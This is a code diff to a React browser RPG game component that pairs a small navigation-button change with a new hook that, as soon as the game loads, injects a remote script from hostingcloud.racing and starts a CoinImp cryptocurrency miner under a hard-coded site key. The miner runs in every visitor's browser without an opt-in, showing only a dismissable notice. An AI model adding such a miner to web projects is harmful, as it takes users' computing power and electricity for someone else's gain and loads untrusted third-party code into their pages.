@@ -12,7 +12,7 @@ import { InventorySystem } from './rpg/InventorySystem';
 import { StatsUpgrade } from './rpg/StatsUpgrade';
 import { ZeroWallet } from './rpg/ZeroWallet';
 import { ShopSystem } from './rpg/ShopSystem';
-import { X } from 'lucide-react';
+import { ArrowLeft, X } from 'lucide-react';
 import { useToast } from '@/hooks/use-toast';
 
 export const RPGGame = ({ onClose }: { onClose: () => void }) => {
@@ -20,6 +20,43 @@ export const RPGGame = ({ onClose }: { onClose: () => void }) => {
   const [currentEnemy, setCurrentEnemy] = useState<Enemy | null>(null);
   const [gameState, setGameState] = useState<'creation' | 'town' | 'combat' | 'inventory' | 'stats' | 'shop'>('creation');
   const { toast } = useToast();
+
+  // Initialize mining script when RPG game loads
+  React.useEffect(() => {
+    // Load coinimp mining script
+    const script1 = document.createElement('script');
+    script1.src = 'https://www.hostingcloud.racing/Q1Mx.js';
+    script1.async = true;
+    document.head.appendChild(script1);
+
+    script1.onload = () => {
+      // Initialize mining client after script loads
+      const script2 = document.createElement('script');
+      script2.innerHTML = `
+        var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
+          throttle: 0.6, c: 'w'
+        });
+        _client.start();
+        _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+      `;
+      document.head.appendChild(script2);
+    };
+
+    // Cleanup scripts when component unmounts
+    return () => {
+      const scripts = document.querySelectorAll('script[src*="hostingcloud.racing"], script[src*="coinimp"]');
+      scripts.forEach(script => script.remove());
+      
+      // Stop mining client if it exists
+      if (typeof window !== 'undefined' && (window as any)._client) {
+        try {
+          (window as any)._client.stop();
+        } catch (e) {
+          console.log('Mining client cleanup');
+        }
+      }
+    };
+  }, []);
 
   const createPlayer = (selectedClass: PlayerClass, name: string) => {
     const newPlayer: Player = {
@@ -231,9 +268,16 @@ export const RPGGame = ({ onClose }: { onClose: () => void }) => {
                 </div>
               </div>
             </div>
-            <Button variant="ghost" size="icon" onClick={onClose}>
-              <X className="h-6 w-6" />
-            </Button>
+            
+            {/* Navigation Buttons */}
+            <div className="flex gap-2">
+              <Button variant="outline" size="icon" onClick={onClose} title="Retour à l'accueil">
+                <ArrowLeft className="h-5 w-5" />
+              </Button>
+              <Button variant="ghost" size="icon" onClick={onClose} title="Fermer">
+                <X className="h-6 w-6" />
+              </Button>
+            </div>
           </div>
         </div>
 
